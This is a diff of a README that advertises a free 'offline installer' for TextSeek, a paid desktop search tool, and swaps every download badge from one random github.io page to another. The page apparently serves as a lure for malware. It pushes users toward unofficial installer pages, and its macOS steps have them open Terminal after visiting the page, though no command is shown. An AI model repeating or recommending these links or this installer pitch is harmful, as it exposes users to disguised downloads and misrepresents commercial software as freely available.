@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-File+Search-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 TextSeek Free Installer** — TextSeek is a Windows desktop search application specialized in full-text search across document formats including Word, PDF, Excel, PowerPoint, and plain text. Works without internet access, no account required. Full offline installation.
+**💻 TextSeek Free Installer** — TextSeek is a Windows and macOS desktop full-text search tool that instantly searches inside documents including PDF, Word, Excel, and PowerPoint files. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install TextSeek](https://img.shields.io/badge/⬇_Install_TextSeek-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install TextSeek](https://img.shields.io/badge/⬇_Install_TextSeek-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About TextSeek
 
-TextSeek is a Windows desktop search application specialized in full-text search across document formats including Word, PDF, Excel, PowerPoint, and plain text. Instantly search through large document collections and find files by their actual content rather than just filenames. TextSeek creates a local search index for fast results, making it ideal for knowledge workers managing large document archives.
+TextSeek is a Windows and macOS desktop full-text search tool that instantly searches inside documents including PDF, Word, Excel, and PowerPoint files. It creates a content index for fast search results without relying on the OS search engine.
 
 ---
 
 ## ❌ Problem: TextSeek is hard to access
 
-- **Windows Only** — No cross-platform version
-- **Index Build Time** — Initial indexing of large document collections takes time
-- **Format Coverage** — Support for some less common document formats may be limited
-- **Commercial License** — Pro version requires paid license for full functionality
+- **Paid License** — Requires purchase
+- **Index Build Time** — Initial document indexing of large collections takes significant time
+- **Resource Usage** — Indexing and background monitoring consume system resources
+- **Limited Format Support** — Some less common document formats may not be indexed
 
 ---
 
@@ -61,9 +61,9 @@ TextSeek is a Windows desktop search application specialized in full-text search
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ TextSeek is a Windows desktop search application specialized in full-text search
 
 <div align="center">
 
-[![⬇ Install TextSeek](https://img.shields.io/badge/⬇_Install_TextSeek-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install TextSeek](https://img.shields.io/badge/⬇_Install_TextSeek-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ TextSeek is a Windows desktop search application specialized in full-text search
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ TextSeek is a Windows desktop search application specialized in full-text search
 
 ---
 
-**TextSeek Free Installer** — TextSeek is a Windows desktop search application specialized in full-text search across document formats including Word, PDF, Excel, PowerPoint, and plain text. Install without internet connection today!
+**TextSeek Free Installer** — TextSeek is a Windows and macOS desktop full-text search tool that instantly searches inside documents including PDF, Word, Excel, and PowerPoint files. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install TextSeek](https://img.shields.io/badge/⬇_Install_TextSeek-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install TextSeek](https://img.shields.io/badge/⬇_Install_TextSeek-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
